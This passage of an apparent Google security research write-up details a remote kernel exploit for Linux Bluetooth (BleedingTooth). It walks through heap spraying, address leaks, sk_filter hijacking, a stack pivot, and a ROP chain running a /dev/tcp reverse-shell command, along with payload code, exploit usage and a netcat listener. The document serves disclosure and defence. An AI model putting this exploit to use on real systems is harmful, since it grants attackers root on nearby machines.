This leaves us with `sk->sk_filter` as the only potential member to corrupt. We will later see how it may be useful to have control over `struct sk_filter`, but first, note that `sk_filter` is located at offset 0x110, whereas the size of `struct amp_mgr` is only 112=0x70 bytes wide. Is it not out of our control then? Yes and no – usually it is not in our control, however if we have a way to shape the heap, then it may be even easier to take full control over the pointer. To elaborate, the `struct amp_mgr` has a size of 112 bytes (between 65 and 128), thus it is allocated within the kmalloc-128 slab. Usually, memory blocks in the slab do not contain metadata such as chunk headers in front, as the goal is to minimize fragmentation. As such, memory blocks are consecutive and therefore, in order to control the pointer at offset 0x110, we must achieve a heap constellation where our desired pointer is located at offset 0x10 of the second block after `struct amp_mgr`.

### Finding a Heap Primitive

In order to shape the kmalloc-128 slab, we need a command that can allocate (preferably controllable) memory with a size between 65-128 bytes. Unlike other L2CAP implementations, the usage of the heap in the Linux implementation is quite low. A quick search for `kmalloc()` or `kzalloc()` in `net/bluetooth/` yields nothing useful – or at least nothing that can be controlled or exist across multiple commands. What we would like to have is a primitive that can allocate memory of arbitrary size, copy attacker-controlled data into it, and leave it around until we decide to free it.

This sounds pretty much like `kmemdup()`, right? Surprisingly, the A2MP protocol offers us exactly such a primitive. Namely, we can issue a `A2MP_GETAMPASSOC_RSP` command to duplicate memory using `kmemdup()` and store the memory address within a control structure:

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c
static int a2mp_getampassoc_rsp(struct amp_mgr *mgr, struct sk_buff *skb,
				struct a2mp_cmd *hdr)
{
	...
	u16 len = le16_to_cpu(hdr->len);
	...
	assoc_len = len - sizeof(*rsp);
	...
	ctrl = amp_ctrl_lookup(mgr, rsp->id);
	if (ctrl) {
		u8 *assoc;

		assoc = kmemdup(rsp->amp_assoc, assoc_len, GFP_KERNEL);
		if (!assoc) {
			amp_ctrl_put(ctrl);
			return -ENOMEM;
		}

		ctrl->assoc = assoc;
		ctrl->assoc_len = assoc_len;
		ctrl->assoc_rem_len = assoc_len;
		ctrl->assoc_len_so_far = 0;

		amp_ctrl_put(ctrl);
	}
	...
}
```

In order for `amp_ctrl_lookup()` to return a control structure, we must first add it into the list using the `A2MP_GETINFO_RSP` command:

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c
static int a2mp_getinfo_rsp(struct amp_mgr *mgr, struct sk_buff *skb,
			    struct a2mp_cmd *hdr)
{
	struct a2mp_info_rsp *rsp = (struct a2mp_info_rsp *) skb->data;
	...
	ctrl = amp_ctrl_add(mgr, rsp->id);
	...
}
```

This is almost the perfect heap primitive, since the size and content can be arbitrary! The only downside is that there is no convenient primitive which allows us to free the allocations. It seems like the only way to free them is to close the HCI connection, which is a relatively slow operation. Yet, to understand how we may free allocations in a controlled way (e.g. free every second allocation to create holes), we need to pay close attention to the memory management. Note that when we store a new memory address at `ctrl->assoc`, we do not free the memory block previously stored there. Rather, that memory block will simply be forgotten when we override it. To make use of this behavior, we can override every second `ctrl->assoc` with an allocation of a different size, and once we close the HCI connection, the other half will be freed while the ones we overrode remain allocated.

### Controlling the Out-Of-Bounds Read

So why did we want to have a heap primitive? Recall that the idea is to shape the heap and achieve a constellation where a memory block controlled by us is located one block away from the `struct amp_mgr` object. By doing so, we can control the value at offset 0x110 which represents the `sk_filter` pointer. As a result, when we trigger the type confusion, we can dereference an arbitrary pointer.

The following basic technique works quite reliably on Ubuntu which uses the SLUB allocator:

1. Allocate a lot of objects with size of 128 bytes to fill the kmalloc-128 slabs.
2. Create a new A2MP channel and hope that the `struct amp_mgr` object is adjacent to sprayed objects.
3. Trigger the type confusion and achieve a controlled out-of-bounds read.

To verify that our heap spray was successful, we can first query `/proc/slabinfo` for information about kmalloc-128 on the victim's machine:

```bash
$ sudo cat /proc/slabinfo
slabinfo - version: 2.1
# name            <active_objs> <num_objs> <objsize> <objperslab> <pagesperslab> : tunables <limit> <batchcount> <sharedfactor> : slabdata <active_slabs> <num_slabs> <sharedavail>
...
kmalloc-128         1440   1440    128   32    1 : tunables    0    0    0 : slabdata     45     45      0
...
```

Then, after the heap spray, we can query once again and find that `active_objs` increased:

```bash
$ sudo cat /proc/slabinfo
...
kmalloc-128         1760   1760    128   32    1 : tunables    0    0    0 : slabdata     55     55      0
...
```

In the example above, we sprayed 320 objects. Now, if we manage to allocate the `struct amp_mgr` object in the surrounding of these newly sprayed objects, we may hit a panic trying to dereference a controlled pointer (observe the value of RAX):

```
[   58.881623] general protection fault: 0000 [#1] SMP PTI
[   58.881639] CPU: 3 PID: 568 Comm: kworker/u9:1 Not tainted 5.4.0-48-generic #52-Ubuntu
[   58.881645] Hardware name: Acer Aspire E5-575/Ironman_SK  , BIOS V1.04 04/26/2016
[   58.881705] Workqueue: hci0 hci_rx_work [bluetooth]
[   58.881725] RIP: 0010:sk_filter_trim_cap+0x65/0x220
[   58.881734] Code: 00 00 4c 89 e6 48 89 df e8 b8 c5 af ff 41 89 c5 85 c0 75 62 48 8b 83 10 01 00 00 48 85 c0 74 56 49 8b 4c 24 18 49 89 5c 24 18 <4c> 8b 78 18 48 89 4d b0 41 f6 47 02 08 0f 85 41 01 00 00 0f 1f 44
[   58.881740] RSP: 0018:ffffbbccc10d3ca0 EFLAGS: 00010202
[   58.881748] RAX: 4343434343434343 RBX: ffff96da38f70300 RCX: 0000000000000000
[   58.881753] RDX: 0000000000000000 RSI: ffff96da62388300 RDI: ffff96da38f70300
[   58.881758] RBP: ffffbbccc10d3d00 R08: ffff96da38f67700 R09: ffff96da68003340
[   58.881763] R10: 00000000000301c0 R11: 8075f638da96ffff R12: ffff96da62388300
[   58.881767] R13: 0000000000000000 R14: 0000000000000001 R15: 0000000000000008
[   58.881774] FS:  0000000000000000(0000) GS:ffff96da69380000(0000) knlGS:0000000000000000
[   58.881780] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   58.881785] CR2: 000055f861e4bd20 CR3: 000000024c80a001 CR4: 00000000003606e0
[   58.881790] Call Trace:
[   58.881869]  ? __l2cap_chan_add+0x88/0x1c0 [bluetooth]
[   58.881938]  l2cap_data_rcv+0x351/0x510 [bluetooth]
[   58.881995]  l2cap_data_channel+0x29f/0x470 [bluetooth]
[   58.882054]  l2cap_recv_frame+0xe5/0x300 [bluetooth]
[   58.882067]  ? __switch_to_asm+0x40/0x70
[   58.882124]  l2cap_recv_acldata+0x2d2/0x2e0 [bluetooth]
[   58.882174]  hci_rx_work+0x186/0x360 [bluetooth]
[   58.882187]  process_one_work+0x1eb/0x3b0
[   58.882197]  worker_thread+0x4d/0x400
[   58.882207]  kthread+0x104/0x140
[   58.882215]  ? process_one_work+0x3b0/0x3b0
[   58.882223]  ? kthread_park+0x90/0x90
[   58.882233]  ret_from_fork+0x35/0x40
```

Inspecting the memory address at RDI of the victim's machine, we can see:

```bash
$ sudo gdb /boot/vmlinuz /proc/kcore
(gdb) x/40gx 0xffff96da38f70300
0xffff96da38f70300:	0xffff96da601e7d00	0xffffffffc0d38760
0xffff96da38f70310:	0xffff96da60de2600	0xffff96da61c13400
0xffff96da38f70320:	0x0000000000000000	0x0000000000000001
0xffff96da38f70330:	0x0000000000000000	0x0000000000000000
0xffff96da38f70340:	0xffff96da38f70340	0xffff96da38f70340
0xffff96da38f70350:	0x0000000000000000	0x0000000000000000
0xffff96da38f70360:	0xffff96da38f70360	0xffff96da38f70360
0xffff96da38f70370:	0x0000000000000000	0x0000000000000000
0xffff96da38f70380:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f70390:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f703a0:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f703b0:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f703c0:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f703d0:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f703e0:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f703f0:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f70400:	0x4141414141414141	0x4242424242424242
0xffff96da38f70410:	0x4343434343434343	0x4444444444444444
0xffff96da38f70420:	0x4545454545454545	0x4646464646464646
0xffff96da38f70430:	0x4747474747474747	0x4848484848484848
```

The value at `0xffff96da38f70410` shows that `sk_filter()` indeed tried to dereference the pointer at offset 0x10 of our spray, which, from the perspective of `struct amp_mgr`, is at offset 0x110. Bingo!

### Leaking the Memory Layout

Now we have a way to shape the heap and prepare it for the _BadKarma_ attack, and as such, have full control over the `sk_filter` pointer. The question is, where shall we point it to? In order to make that primitive useful, we must point it to a memory address whose content we can control. That is where the _BadChoice_ vulnerability comes into play. This vulnerability has the potential to disclose the memory layout and aid us in achieving the goal of controlling a memory block whose address we also know.

As mentioned earlier, in order to exploit uninitialized stack variable bugs, we must first send some different commands to populate the stack frame with interesting data (such as pointers to the heap or to .text segments relevant for ROP chains). Then, we can send the vulnerable command to receive that data.

By trying some random L2CAP commands, we can observe that by triggering BadChoice without any special command beforehand, a .text segment pointer to the kernel image can be leaked. Furthermore, by sending a `L2CAP_CONF_RSP` and trying to reconfigure the A2MP channel to `L2CAP_MODE_ERTM` beforehand, the address of a `struct l2cap_chan` object at offset 0x110 can be leaked. This object has a size of 792 bytes and is allocated within the kmalloc-1024 slab.

```c
// pahole -E -C l2cap_chan --hex bluetooth.ko
struct l2cap_chan {
	...
	struct delayed_work {
		struct work_struct {
			/* typedef atomic_long_t -> atomic64_t */ struct {
				/* typedef s64 -> __s64 */ long long int counter;        /* 0x110   0x8 */
			} data; /* 0x110   0x8 */
			...
		} work; /* 0x110  0x20 */
		...
	} chan_timer; /* 0x110  0x58 */
	...
	/* size: 792, cachelines: 13, members: 87 */
	/* sum members: 774, holes: 9, sum holes: 18 */
	/* paddings: 4, sum paddings: 16 */
	/* last cacheline: 24 bytes */
};
```

It turns out that this object belongs to the A2MP channel and it can be deallocated by destroying the channel. This is useful because it allows us to apply the same strategy as for Use-After-Free attacks.

Consider the following technique:

1. Leak the address of the `struct l2cap_chan` object.
2. Free the `struct l2cap_chan` object by destroying the A2MP channel.
3. Reconnect the A2MP channel and spray the kmalloc-1024 slab with the heap primitive.
4. Possibly, it will reclaim the address of the former `struct l2cap_chan` object.

In other words, the address that belonged to `struct l2cap_chan` may now belong to us! Again, the used technique is very basic but works quite reliably on Ubuntu with the SLUB allocator. A concern is that when reconnecting the A2MP channel, the former `struct l2cap_chan` may be reoccupied by the new `struct l2cap_chan` before the heap spray can reclaim the location. If that is the case, multiple connections can be used to have the ability to continue spraying even if the other connection has been shut down.

Note that allocating objects in the kmalloc-1024 slab is a bit more complicated than the kmalloc-128 slab, because:

* The ACL MTU is usually smaller than 1024 bytes (can be checked with `hciconfig`).
* The default MTU for the A2MP channel is `L2CAP_A2MP_DEFAULT_MTU=670` bytes.

Both MTU limitations are easy to bypass. Namely, we can bypass the ACL MTU by fragmenting the request into multiple L2CAP packets, and we can bypass the A2MP MTU by sending a `L2CAP_CONF_MTU` response and configuring it to 0xffff bytes. Here again, it is unclear why the Bluetooth specification does not explicitly disallow parsing configuration responses if no request has been sent.

Let’s try out the technique:

```bash
$ gcc -o exploit exploit.c -lbluetooth && sudo ./exploit XX:XX:XX:XX:XX:XX
[*] Opening hci device...
[*] Connecting to victim...
[+] HCI handle: 100
[*] Connecting A2MP channel...
[*] Leaking A2MP kernel stack memory...
[+] Kernel address: ffffffffad2001a4
[+] KASLR offset: 2b600000
[*] Preparing to leak l2cap_chan address...
[*] Leaking A2MP kernel stack memory...
[+] l2cap_chan address: ffff98ee5c62fc00
[*] Spraying kmalloc-1024...
```

Notice how the most significant bytes of both leaked pointers differ. By observing the higher bytes, we can make an educated guess (or check the Linux documentation) to determine whether they belong to a segment, heap, or stack. To confirm that we were indeed able to reclaim the address of `struct l2cap_chan`, we can inspect the memory on the victim's machine using:

```bash
$ sudo gdb /boot/vmlinuz /proc/kcore
(gdb) x/40gx 0xffff98ee5c62fc00
0xffff98ee5c62fc00:	0x4141414141414141	0x4242424242424242
0xffff98ee5c62fc10:	0x4343434343434343	0x4444444444444444
0xffff98ee5c62fc20:	0x4545454545454545	0x4646464646464646
0xffff98ee5c62fc30:	0x4747474747474747	0x4848484848484848
...
0xffff98ee5c62fd00:	0x6161616161616161	0x6262626262626262
0xffff98ee5c62fd10:	0x6363636363636363	0x6464646464646464
0xffff98ee5c62fd20:	0x6565656565656565	0x6666666666666666
0xffff98ee5c62fd30:	0x6767676767676767	0x6868686868686868
```

The memory content looks very promising! Note that it is useful to spray with a pattern, since that allows us to recognize memory blocks immediately and understand which offsets get dereferenced when a panic is hit.

### Plugging It All Together

We now have all primitives we need to complete our RCE:

1. We can control a memory block whose address we know (referred to as the "payload").
2. We can leak a .text segment pointer and build a ROP chain which we can store in the payload.
3. We can take full control over the `sk_filter` field and point it to our payload.

#### Achieving RIP Control

Let’s take a look back at `sk_filter_trim_cap()`, and understand why having control over `sk_filter` is beneficial.

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/core/filter.c
int sk_filter_trim_cap(struct sock *sk, struct sk_buff *skb, unsigned int cap)
{
	...
	rcu_read_lock();
	filter = rcu_dereference(sk->sk_filter);
	if (filter) {
		struct sock *save_sk = skb->sk;
		unsigned int pkt_len;

		skb->sk = sk;
		pkt_len = bpf_prog_run_save_cb(filter->prog, skb);
		skb->sk = save_sk;
		err = pkt_len ? pskb_trim(skb, max(cap, pkt_len)) : -EPERM;
	}
	rcu_read_unlock();

	return err;
}
```

Since we control the value of `filter`, we can also control `filter->prog` by placing a pointer at offset 0x18 in our payload. Namely, this is the offset of `prog`:

```c
// pahole -E -C sk_filter --hex bluetooth.ko
struct sk_filter {
	...
	struct bpf_prog *          prog;                                                 /*  0x18   0x8 */

	/* size: 32, cachelines: 1, members: 3 */
	/* sum members: 28, holes: 1, sum holes: 4 */
	/* forced alignments: 1, forced holes: 1, sum forced holes: 4 */
	/* last cacheline: 32 bytes */
} __attribute__((__aligned__(8)));
```

Here, the structure of `struct buf_prog` is:

```c
// pahole -E -C bpf_prog --hex bluetooth.ko
struct bpf_prog {
	...
	unsigned int               (*bpf_func)(const void  *, const struct bpf_insn  *); /*  0x30   0x8 */
	union {
		...
		struct bpf_insn {
			/* typedef __u8 */ unsigned char code;                           /*  0x38   0x1 */
			/* typedef __u8 */ unsigned char dst_reg:4;                      /*  0x39: 0 0x1 */
			/* typedef __u8 */ unsigned char src_reg:4;                      /*  0x39:0x4 0x1 */
			/* typedef __s16 */ short int  off;                              /*  0x3a   0x2 */
			/* typedef __s32 */ int        imm;                              /*  0x3c   0x4 */
		} insnsi[0]; /*  0x38     0 */
	};                                                                               /*  0x38     0 */

	/* size: 56, cachelines: 1, members: 20 */
	/* sum members: 50, holes: 1, sum holes: 4 */
	/* sum bitfield members: 10 bits, bit holes: 1, sum bit holes: 6 bits */
	/* last cacheline: 56 bytes */
};
```

The function `bpf_prog_run_save_cb()` then passes `filter->prog` to `BPF_PROG_RUN()`:

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/filter.h
static inline u32 __bpf_prog_run_save_cb(const struct bpf_prog *prog,
					 struct sk_buff *skb)
{
	...
	res = BPF_PROG_RUN(prog, skb);
	...
	return res;
}

static inline u32 bpf_prog_run_save_cb(const struct bpf_prog *prog,
				       struct sk_buff *skb)
{
	u32 res;

	migrate_disable();
	res = __bpf_prog_run_save_cb(prog, skb);
	migrate_enable();
	return res;
}
```

That in turn calls `bpf_dispatcher_nop_func()` with `ctx`, `prog->insnsi` and `prog->bpf_func()` as parameters:

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/filter.h
#define __BPF_PROG_RUN(prog, ctx, dfunc)	({			\
	u32 ret;							\
	cant_migrate();							\
	if (static_branch_unlikely(&bpf_stats_enabled_key)) {		\
		...
		ret = dfunc(ctx, (prog)->insnsi, (prog)->bpf_func);	\
		...
	} else {							\
		ret = dfunc(ctx, (prog)->insnsi, (prog)->bpf_func);	\
	}								\
	ret; })

#define BPF_PROG_RUN(prog, ctx)						\
	__BPF_PROG_RUN(prog, ctx, bpf_dispatcher_nop_func)
```

Finally, the dispatcher calls the `prog->bpf_func()` handler with `ctx` and `prog->insnsi` as arguments:

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/bpf.h
static __always_inline unsigned int bpf_dispatcher_nop_func(
	const void *ctx,
	const struct bpf_insn *insnsi,
	unsigned int (*bpf_func)(const void *,
				 const struct bpf_insn *))
{
	return bpf_func(ctx, insnsi);
}
```

All in all, we have:

```c
sk->sk_filter->prog->bpf_func(skb, sk->sk_filter->prog->insnsi);
```

As we have control over `sk->sk_filter`, we also have control over the two later dereferences. This ultimately gives us RIP control with the RSI register (second argument) pointing to our payload.

#### Kernel Stack Pivoting

Since modern CPUs have NX, it is not possible to directly execute shellcodes. However, we can perform a code-reuse attack such as ROP/JOP. Of course, in order to reuse code, we must know where it is located, which is why the KASLR bypass is essential. Regarding the possible attacks, ROP is normally easier to perform than JOP, but that requires us to redirect the stack pointer RSP. For this reason, exploit developers usually perform JOP to stack pivot and then finish with a ROP chain.

The idea is to redirect the stack pointer to a fake stack in our payload consisting of ROP gadgets, i.e. our ROP chain. Since we know that RSI points to our payload, we want to move the value of RSI to RSP. Let’s see if there is a gadget that allows us to do so.

To extract the gadgets, we can use the following tools:

* [extract-vmlinux](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/scripts/extract-vmlinux) to decompress `/boot/vmlinuz`.
* [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) to extract ROP gadgets from `vmlinux`.

Looking for gadgets like `mov rsp, X ; ret`, we can see that none of them are useful.

```bash
$ cat gadgets.txt | grep ": mov rsp.*ret"
0xffffffff8109410c : mov rsp, qword ptr [rip + 0x15bb0fd] ; pop rbx ; pop rbp ; ret
0xffffffff810940c2 : mov rsp, qword ptr [rsp] ; pop rbp ; ret
0xffffffff8108ef0c : mov rsp, rbp ; pop rbp ; ret
```

Maybe there is something like `push rsi ; pop rsp ; ret`?

```bash
$ cat gadgets.txt | grep ": push rsi.*pop rsp.*ret"
0xffffffff81567f46 : push rsi ; adc al, 0x57 ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
0xffffffff8156a128 : push rsi ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop rbp ; ret
0xffffffff81556cad : push rsi ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
0xffffffff81c02ab5 : push rsi ; lcall [rbx + 0x41] ; pop rsp ; pop rbp ; ret
0xffffffff8105e049 : push rsi ; sbb byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
0xffffffff81993887 : push rsi ; xchg eax, ecx ; lcall [rbx + 0x41] ; pop rsp ; pop r13 ; pop rbp ; ret
```

Perfect, there are lots of gadgets that can be used. Interestingly, all gadgets dereference RBX+0x41, which is most likely part of a commonly used instruction or sequence of instructions. To elaborate, as instructions can begin at any byte in x86, they can be interpreted differently based on the start byte. The dereference of RBX+0x41 may actually hinder us from using the gadgets – namely, if RBX does not contain a writable memory address at the execution of `bpf_func()`, we will simply hit a panic before we can execute our ROP chain. In our case, luckily, RBX points to the `struct amp_mgr` object and it does not really hurt if the byte at offset 0x41 gets changed.

When choosing the stack pivot gadget as a function pointer for `bpf_func()` and triggering it, the value of RSI will be pushed onto stack, then popped from stack and finally assigned to RSP. In other words, the stack pointer will point to our payload, and once the `RET` instruction is executed, our ROP chain will kick off.

```c
static void build_payload(uint8_t data[0x400]) {
  // Fake sk_filter object starting at offset 0x300.
  *(uint64_t *)&data[0x318] = l2cap_chan_addr + 0x320;  // prog

  // Fake bpf_prog object starting at offset 0x320.
  // RBX points to the amp_mgr object.
  *(uint64_t *)&data[0x350] =
      kaslr_offset +
      PUSH_RSI_ADD_BYTE_PTR_RBX_41_BL_POP_RSP_POP_RBP_RET;  // bpf_func
  *(uint64_t *)&data[0x358] = 0xDEADBEEF;                   // rbp

  // Build kernel ROP chain that executes run_cmd() from kernel/reboot.c.
  // Note that when executing the ROP chain, the data below in memory will be
  // overwritten. Therefore, the argument should be located after the ROP chain.
  build_krop_chain((uint64_t *)&data[0x360], l2cap_chan_addr + 0x3c0);
  strncpy(&data[0x3c0], remote_command, 0x40);
}
```

With that, we have finally achieved RCE. To debug our stack pivot and see if we were successful, we can set `*(uint64_t *)&data[0x360]=0x41414141` and observe a controlled panic.

#### Kernel ROP Chain Execution

Now, we can either write a big ROP chain that retrieves and executes a C payload, or a smaller one that allows us to run an arbitrary command. For the sake of the Proof-Of-Concept, we are already satisfied with a reverse shell, thus executing a command is enough for us. Inspired by the ROP chain described in the write-up [CVE-2019-18683: Exploiting a Linux kernel vulnerability in the V4L2 subsystem](https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html), we will build a chain that calls `run_cmd()` with `/bin/bash -c /bin/bash</dev/tcp/IP/PORT` to spawn a reverse shell, and finally calls `do_task_dead()` to stop the kernel thread. After that, Bluetooth will no longer work. In a more sophisticated exploit, we would resume the execution.

To determine offsets for both methods, we can simply inspect the live symbols on the victim's machine:

```bash
$ sudo cat /proc/kallsyms | grep "run_cmd\|do_task_dead"
ffffffffab2ce470 t run_cmd
ffffffffab2dc260 T do_task_dead
```

Here, the KASLR slide is 0x2a200000 which can be calculated by grep'ing for the `_text` symbol and subtracting `0xffffffff81000000`:

```bash
$ sudo cat /proc/kallsyms | grep "T _text"
ffffffffab200000 T _text
```

Subtracting the slide from the two addresses from before yields:

```c
#define RUN_CMD 0xffffffff810ce470
#define DO_TASK_DEAD 0xffffffff810dc260
```

Finally, we can find gadgets for `pop rax ; ret`, `pop rdi ; ret` and `jmp rax` with ROPgadget and then we can construct the kernel ROP chain according to this example:

```c
static void build_krop_chain(uint64_t *rop, uint64_t cmd_addr) {
  *rop++ = kaslr_offset + POP_RAX_RET;
  *rop++ = kaslr_offset + RUN_CMD;
  *rop++ = kaslr_offset + POP_RDI_RET;
  *rop++ = cmd_addr;
  *rop++ = kaslr_offset + JMP_RAX;
  *rop++ = kaslr_offset + POP_RAX_RET;
  *rop++ = kaslr_offset + DO_TASK_DEAD;
  *rop++ = kaslr_offset + JMP_RAX;
}
```

This ROP chain should be placed at offset 0x40 within the fake `struct bpf_prog` object, and `cmd_addr` should point to the bash command planted in kernel memory. With everything at the right place, we can finally retrieve a root shell from the victim.

## Proof-Of-Concept

The Proof-Of-Concept is available at [https://github.com/google/security-research/tree/master/pocs/linux/bleedingtooth](https://github.com/google/security-research/tree/master/pocs/linux/bleedingtooth).

Compile it using:

```bash
$ gcc -o exploit exploit.c -lbluetooth
```

and execute it as:

```bash
$ sudo ./exploit target_mac source_ip source_port
```

In another terminal, run:

```bash
$ nc -lvp 1337
exec bash -i 2>&0 1>&0
```

If successful, a calc can be spawned with:

```bash
export XAUTHORITY=/run/user/1000/gdm/Xauthority
export DISPLAY=:0
gnome-calculator
```

Occasionally, the victim may print `Bluetooth: Trailing bytes: 6 in sframe` in dmesg. This happens if the kmalloc-128 slab spray has not been successful. In that case, we need to repeat the exploit. As an anecdote regarding the name "BadKarma", the _BadKarma_ exploit occasionally managed to bail out early in `sk_filter()`, e.g. when the field `sk_filter` is 0, and proceed with executing the A2MP receive handler and sending back a A2MP response packet. Hilariously, when that happened, the victim's machine did not panic – instead, the attacker's machine would panic; because, as we learned earlier, the ERTM implementation used by the A2MP protocol would by design trigger a type confusion.


## Timeline

2020-07-06 – _BadVibes_ vulnerability discovered internally at Google  
2020-07-20 – _BadKarma_ and _BadChoice_ vulnerabilities discovered internally at Google  
2020-07-22 – Linux Torvalds reports independent discovery of the _BadVibes_ vulnerability to BlueZ with a 7 day disclosure timeline  
2020-07-24 – Technical details on the three BleedingTooth vulnerabilities reported to [BlueZ main developers](http://www.bluez.org/development/credits/) (Intel)  
2020-07-29 – Intel schedules a meeting for 2020-07-31 with Google  
2020-07-30 – _BadVibes_ fix released  
2020-07-31 – Intel sets disclosure date to 2020-09-01, with a prior NDA'd disclosure coordinated by Intel. The informed parties are approved to disable BT_HS via kconfig given a non-security commit message  
2020-08-12 – Intel adjusts disclosure date to 2020-10-13 (90days from initial report)  
2020-09-25 – Intel commits patches to public [bluetooth-next](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/net/bluetooth?id=f19425641cb2572a33cb074d5e30283720bd4d22) branch  
2020-09-29 – Patches merged with [5.10 linux-next branch](https://git.kernel.org/pub/scm/linux/kernel/git/next/linux-next.git/commit/net/bluetooth?id=2bd056f550808eaa2c34a14169c99f81ead083a7).  
2020-10-13 – Public disclosure of Intel's advisory, followed by disclosure of Google advisories  
2020-10-14 – Intel corrects the recommended fixed version from 5.9 to the 5.10 kernel  
2020-10-15 – Intel removes kernel upgrade recommendation

## Conclusion

The path from starting with zero knowledge to uncovering three vulnerabilities in the Bluetooth HCI protocol was strange and unexpected. When I first found the _BadVibes_ vulnerability, I thought it was only triggerable by vulnerable/malicious Bluetooth chips, as the bug seemed too obvious. Since I did not have two programmable devices with Bluetooth 5, I could not verify if receiving such a large advertisement was even possible. Only after comparing the Linux Bluetooth stack with other implementations and reading the specifications, did I come to the conclusion that I had actually discovered my first RCE vulnerability, and I immediately went out to purchase another laptop (surprisingly, there are no trustworthy BT5 dongles on the market). Analyzing the overflow, it was soon clear that an additional information leak vulnerability was needed. Much faster than I thought it would take, I discovered _BadChoice_ after just two days. While trying to trigger it, I uncovered the _BadKarma_ vulnerability which I first deemed to be an unfortunate bug that would prevent the _BadChoice_ vulnerability. It turned out that it was quite easy to bypass and that the bug was in truth yet another high severity security vulnerability. Researching the Linux Bluetooth stack and developing the RCE exploit was challenging but exciting, especially since it was my first time auditing and debugging the Linux kernel. I was happy that, as a result of this work, the decision was made to [disable the Bluetooth High Speed feature by default](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/net/bluetooth?id=b176dd0ef6afcb3bca24f41d78b0d0b731ec2d08) in order to reduce the attack surface, which also meant the removal of the powerful heap primitive. Moreover, I converted the knowledge gained from this research into [syzkaller contributions](https://github.com/google/syzkaller/commits?author=TheOfficialFloW) which enabled fuzzing the `/dev/vhci` device and uncovered >40 additional bugs. Although most of these bugs were unlikely to be exploitable, or even remotely triggerable, they allowed engineers to identify and fix other weaknesses ([Bluetooth: Fix null pointer dereference in hci_event_packet()](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=b50dc237ac04d499ad4f3a92632470a9eb844f7d), [Bluetooth: Fix memory leak in read_adv_mon_features()](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=cafd472a10ff3bccd8afd25a69f20a491cd8d7b8) or [Bluetooth: Fix slab-out-of-bounds read in hci_extended_inquiry_result_evt()](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=51c19bf3d5cfaa66571e4b88ba2a6f6295311101)), and as such contributed to having a safer and more stable kernel.


## Thanks

Dirk Göhmann  
Eduardo Vela  
Francis Perron  
Jann Horn
